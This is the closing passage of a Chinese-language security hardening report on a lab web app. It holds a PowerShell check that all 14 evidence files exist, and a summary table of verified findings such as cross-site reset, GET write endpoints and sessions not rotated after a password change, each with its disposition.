  'security\learning\_evidence\loop2-verify-pathprobe.py',
  'security\learning\_evidence\t2-edgecases-20261012.json',
  'security\learning\_evidence\t2-edgecases-20261012.py',
  'security\learning\_evidence\t2-apppy-diff-20261012.patch',
  'security\learning\_evidence\loop3-a-verify-20261012-212153.json',
  'target-site-lab\app.py',
  'target-site-lab\app.py.loop1-original',
  'security\learning\hardening\A-档验证报告-20261012.md',
  'security\learning\hardening\A-档加固实施报告-t2-20261012.md'
)
$missing = @($refs | Where-Object { -not (Test-Path -LiteralPath (Join-Path $root $_)) })
"refs=$($refs.Count)  missing=$($missing.Count)"
$missing | ForEach-Object { "MISSING: $_" }
```

**本轮实测输出**：`refs=14  missing=0`

---

## 附：三态汇总（供下游 t5 / A5 收口）

| 三态 | 编号 | 处置 |
|---|---|---|
| 成功 · 需处理 | **D1** 跨站复位、**B1/C6** 两个 GET 写入口、**B3** 改密不轮换会话 | 建议并入 A5 绕过对抗专项统一收口 |
| 成功 · 可接受 | **B2** token 走 query | P2 改进 |
| 成功（orig）/ 失败（hard） | **C3** 裸路径变体 | 加固净收益，无需处理 |
| 失败 · 阴性留证 | D2、D3、D4、D5、E1、B4 | 作为回归测试用例保留 |
| 未验证 | 9 项，见 §5 | 其中「Cookie 属性取证」优先级最高 |
